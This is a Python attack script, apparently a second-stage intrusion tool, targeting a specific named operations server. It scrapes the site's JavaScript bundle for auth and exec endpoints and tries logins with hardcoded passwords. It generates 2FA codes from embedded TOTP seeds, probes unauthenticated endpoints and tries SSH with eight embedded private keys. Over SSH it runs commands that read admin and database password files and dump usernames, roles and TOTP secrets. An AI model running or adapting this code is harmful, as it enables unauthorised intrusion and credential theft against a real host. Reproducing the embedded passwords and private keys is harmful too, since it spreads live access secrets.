#!/usr/bin/env python3
# i29468 round2: mine ops SPA bundle for API/auth/enroll protocol; retry login variants; try SSH to ops host 124.223.170.146 with legacy keys.
import os, sys, json, time, base64, hmac, hashlib, struct, subprocess, re, tempfile

HOST = "cloud-ops.lumiiai.cn"
OPSIP = "124.223.170.146"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PASSWORD = "iGIqnu4f8UGepPjBtQRt"
DBPW = "429558bbd9d076d95830b5281d047110eba1e4cb13aab648"
SEEDS = ["76CB3BZ7EFX6W2W3QNP4XW355KNJL56V", "76CB3B7EFX6W2W3QNP4XW355KNJL56V"]
START = time.time()
WORK = tempfile.mkdtemp(prefix="ops2-")

def b64(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, b64(v)), flush=True)

def run(args, timeout=60, inp=None):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, input=inp)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def curl(path, method="GET", body=None, headers=None, cj=None, save_cj=None, timeout=25, maxlen=200000):
    url = path if path.startswith("http") else "https://%s%s" % (HOST, path)
    hf = os.path.join(WORK, "hdr")
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-D", hf]
    if cj: a += ["-b", cj]
    if save_cj: a += ["-c", save_cj]
    for h in (headers or []):
        a += ["-H", h]
    if body is not None:
        a += ["-X", method, "--data-binary", body if isinstance(body, str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])):
            a += ["-H", "Content-Type: application/json"]
    elif method != "GET":
        a += ["-X", method]
    a += [url, "-w", "\n__C__%{http_code}"]
    rc, out, err = run(a, timeout=timeout + 20)
    t = out.decode("utf-8", "replace")
    c = ""
    i = t.rfind("__C__")
    if i >= 0:
        c = t[i+5:].strip()[:3]
        t = t[:i]
    try: hdrs = open(hf, "r", errors="replace").read()[-2000:]
    except Exception: hdrs = ""
    return {"code": c, "body": t[:maxlen], "headers": hdrs, "rc": rc}

def totp(secret, t=None, step=30, digits=6):
    t = int(t if t is not None else time.time())
    s = secret.upper().replace(" ", "")
    s = s + "=" * ((8 - len(s) % 8) % 8)
    try: key = base64.b32decode(s)
    except Exception as e: return "ERR"
    h = hmac.new(key, struct.pack(">Q", t // step), hashlib.sha1).digest()
    o = h[-1] & 0x0f
    return str((struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % (10 ** digits)).zfill(digits)

# ---------- 1) bundle mining ----------
js = curl("/assets/index-vk_qsCO3.js", timeout=40, maxlen=2000000)
body = js["body"]
mine = {"bundle": {"code": js["code"], "len": len(body)}}
strs = sorted(set(re.findall(r'["\'`](/[A-Za-z0-9_\-/$:.{}\\ ]{1,70})["\'`]', body)))
mine["paths"] = [s for s in strs if re.search(r"api|auth|login|2fa|enroll|exec|command|instance|agent|user|audit|credential|secret|version|health|deploy|task|file|shell|postgres|db", s, re.I)][:400]
ctx = {}
for kw in ["agent/enroll", "enroll-token", "enrollToken", "X-Enroll", "/exec", "i.exec", "/i/", "shell_command",
           "skipVerifyGate", "2fa/verify", "auth/login", "password", "agent-versions", "commands",
           "/api", "/audit/verify", "PLATFORM_PUBLIC_KEY", "publicKey", "lumii-ops-agent"]:
    hits = []
    for m in re.finditer(re.escape(kw), body):
        hits.append(body[max(0, m.start()-220):m.start()+260])
        if len(hits) >= 3: break
    ctx[kw] = hits
mine["ctx"] = ctx
R("MINE", mine)

# ---------- 2) login variants ----------
cj = os.path.join(WORK, "cj")
tries = [("admin", PASSWORD), ("admin", DBPW), ("eericxu", PASSWORD)]
lg = {}
for u, p in tries:
    r = curl("/api/auth/login", method="POST", body={"username": u, "password": p}, save_cj=cj, timeout=20, maxlen=2000)
    lg[u + "|" + p[:6]] = r
    time.sleep(0.5)
R("LOGIN2", lg)

# if any 200 mfa, do 2fa
ok = [k for k, v in lg.items() if v["code"] == "200"]
two = {}
if ok:
    for sd in SEEDS:
        code = totp(sd)
        r = curl("/api/auth/2fa/verify", method="POST", body={"code": code}, cj=cj, save_cj=cj, timeout=20, maxlen=2000)
        two[sd[:6] + "|" + code] = r
        time.sleep(0.4)
    two["me"] = curl("/api/auth/me", cj=cj, timeout=15, maxlen=3000)
R("TWOFA2", two)

# ---------- 3) no-auth endpoint sweep ----------
sweep = {}
for p in ["/api/agent/enroll", "/api/agent/versions", "/api/agent-versions", "/api/instances/version-matrix",
          "/api/instances/agent-drift", "/api/enroll-token", "/api/auth/2fa/setup", "/api/auth/2fa/enroll",
          "/api/audit/verify", "/verify", "/api/i", "/api/i/exec", "/api/exec", "/api/shell",
          "/api/backup", "/api/migrations", "/api/config/public", "/api/public/config",
          "/api/health/detail", "/api/metrics", "/api/version/public", "/api/auth/providers"]:
    sweep[p] = curl(p, timeout=12, maxlen=1500)
    time.sleep(0.12)
R("SWEEP", sweep)

# ---------- 4) SSH attempts to ops host ----------

# actual key material injected from local file at deploy time (see KEYS_B64 env/substitution)
KEYS_EMBED = json.loads('{"13_key_Lumii3-For-Old-Coding-Dashboard.pem": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACA7lvHIvxtirJ48Hlpt61KuV+F+aTHF4k5dxaUsS8ni4QAAAJADieYeA4nm\\nHgAAAAtzc2gtZWQyNTUxOQAAACA7lvHIvxtirJ48Hlpt61KuV+F+aTHF4k5dxaUsS8ni4Q\\nAAAECd02pKJFvrsmmJ0k8ltSsG4feUhsydkoqqLGyU7W6d1TuW8ci/G2KsnjweWm3rUq5X\\n4X5pMcXiTl3FpSxLyeLhAAAADGNvZGVyQGx1bWlpMwE=\\n-----END OPENSSH PRIVATE KEY-----\\n", "21_key_lumii3_coder.pem": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACA7lvHIvxtirJ48Hlpt61KuV+F+aTHF4k5dxaUsS8ni4QAAAJD6aSl5+mkp\\neQAAAAtzc2gtZWQyNTUxOQAAACA7lvHIvxtirJ48Hlpt61KuV+F+aTHF4k5dxaUsS8ni4Q\\nAAAECd02pKJFvrsmmJ0k8ltSsG4feUhsydkoqqLGyU7W6d1TuW8ci/G2KsnjweWm3rUq5X\\n4X5pMcXiTl3FpSxLyeLhAAAADGNvZGVyQGx1bWlpMwE=\\n-----END OPENSSH PRIVATE KEY-----\\n", "24_id_ed25519": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQAAAKCcjb59nI2+\\nfQAAAAtzc2gtZWQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQ\\nAAAECTLg2bAR5FxqGxzRiZE0fgJEaDWLfTxlDZGuPWgkYiFLJSKQgicIgYtGDL5wW4svaq\\nCHPgGdFqK6zAfsrug9WpAAAAFnVidW50dUBpcC0xNzItMzEtMTQtMTMBAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n", "20_ubuntu_id_ed25519": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQAAAKCcjb59nI2+\\nfQAAAAtzc2gtZWQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQ\\nAAAECTLg2bAR5FxqGxzRiZE0fgJEaDWLfTxlDZGuPWgkYiFLJSKQgicIgYtGDL5wW4svaq\\nCHPgGdFqK6zAfsrug9WpAAAAFnVidW50dUBpcC0xNzItMzEtMTQtMTMBAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n", "19_k_ubuntu_ezkoder0": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQAAAKCcjb59nI2+\\nfQAAAAtzc2gtZWQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQ\\nAAAECTLg2bAR5FxqGxzRiZE0fgJEaDWLfTxlDZGuPWgkYiFLJSKQgicIgYtGDL5wW4svaq\\nCHPgGdFqK6zAfsrug9WpAAAAFnVidW50dUBpcC0xNzItMzEtMTQtMTMBAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n", "22_ezkoder0.key": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQAAAKCcjb59nI2+\\nfQAAAAtzc2gtZWQyNTUxOQAAACCyUikIInCIGLRgy+cFuLL2qghz4BnRaiuswH7K7oPVqQ\\nAAAECTLg2bAR5FxqGxzRiZE0fgJEaDWLfTxlDZGuPWgkYiFLJSKQgicIgYtGDL5wW4svaq\\nCHPgGdFqK6zAfsrug9WpAAAAFnVidW50dUBpcC0xNzItMzEtMTQtMTMBAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n", "17_cred_lumii-cloud.pem": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACB/MnESD5AGICGomIg1qx+dAg1ZUyh4js53F6GjkxDgpwAAAKBIbK5VSGyu\\nVQAAAAtzc2gtZWQyNTUxOQAAACB/MnESD5AGICGomIg1qx+dAg1ZUyh4js53F6GjkxDgpw\\nAAAEBM8DZT4C7achNl6DVpw9thfnRHnZmsL+IDWG7FPhZvHH8ycRIPkAYgIaiYiDWrH50C\\nDVlTKHiOzncXoaOTEOCnAAAAFm1vbW9saWFvbGlhb0BnbWFpbC5jb20BAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n", "6_lumii-cloud.pem": "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACB/MnESD5AGICGomIg1qx+dAg1ZUyh4js53F6GjkxDgpwAAAKBIbK5VSGyu\\nVQAAAAtzc2gtZWQyNTUxOQAAACB/MnESD5AGICGomIg1qx+dAg1ZUyh4js53F6GjkxDgpw\\nAAAEBM8DZT4C7achNl6DVpw9thfnRHnZmsL+IDWG7FPhZvHH8ycRIPkAYgIaiYiDWrH50C\\nDVlTKHiOzncXoaOTEOCnAAAAFm1vbW9saWFvbGlhb0BnbWFpbC5jb20BAgMEBQYH\\n-----END OPENSSH PRIVATE KEY-----\\n"}')
keydir = os.path.join(WORK, "keys"); os.makedirs(keydir, exist_ok=True)
for name, mat in KEYS_EMBED.items():
    p = os.path.join(keydir, name)
    open(p, "w").write(mat)
    os.chmod(p, 0o600)

def ssh_try(keyname, user, host=OPSIP, cmd="id; hostname; sudo -n id 2>&1 | head -2", timeout=25):
    kp = os.path.join(keydir, keyname)
    if not os.path.exists(kp): return {"err": "no_key"}
    a = ["ssh", "-i", kp, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
         "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=12", "-o", "LogLevel=ERROR",
         "%s@%s" % (user, host), cmd]
    rc, out, err = run(a, timeout=timeout + 15)
    return {"rc": rc, "out": out.decode("utf-8", "replace")[:1500], "err": err.decode("utf-8", "replace")[:400]}

# reachability
reach = {}
rc, out, err = run(["bash", "-c", "timeout 8 bash -c 'echo > /dev/tcp/%s/22' && echo OPEN || echo CLOSED" % OPSIP], timeout=15)
reach["22"] = out.decode().strip()
R("SSHREACH", reach)

CMDH = r"""id; hostname; echo '@@ADMINPW'; sudo cat /data/lumii-ops/admin-password.txt 2>&1 | head -3; echo '@@PG'; sudo cat /data/lumii-ops/.pgpass 2>&1 | head -3; echo '@@USERS'; PW=$(sudo cat /data/lumii-ops/.pgpass 2>/dev/null); sudo PGPASSWORD="$PW" psql -h 127.0.0.1 -p 55432 -U lumii_ops -d lumii_ops -Atc "select username||'|'||role||'|'||coalesce(totp_secret,'') from users" 2>&1 | head -20; echo '@@LS'; sudo ls -la /data/lumii-ops 2>&1 | head -30"""
combos = [("13_key_Lumii3-For-Old-Coding-Dashboard.pem", "ubuntu"),
          ("13_key_Lumii3-For-Old-Coding-Dashboard.pem", "root"),
          ("13_key_Lumii3-For-Old-Coding-Dashboard.pem", "lumii"),
          ("21_key_lumii3_coder.pem", "ubuntu"),
          ("24_id_ed25519", "ubuntu"),
          ("20_ubuntu_id_ed25519", "ubuntu"),
          ("19_k_ubuntu_ezkoder0", "ubuntu"),
          ("22_ezkoder0.key", "ubuntu")]
sshres = {}
if reach["22"].endswith("OPEN"):
    for kn, u in combos:
        sshres[kn + "|" + u] = ssh_try(kn, u, cmd=CMDH)
        if "uid=" in (sshres[kn + "|" + u].get("out") or ""): break
        time.sleep(1.0)
else:
    # even if bash /dev/tcp unavailable, still try one ssh
    sshres["13|ubuntu"] = ssh_try("13_key_Lumii3-For-Old-Coding-Dashboard.pem", "ubuntu", cmd=CMDH)
R("SSH", sshres)

R("DONE", {"elapsed": int(time.time() - START)})
print("ROUND2_DONE", flush=True)
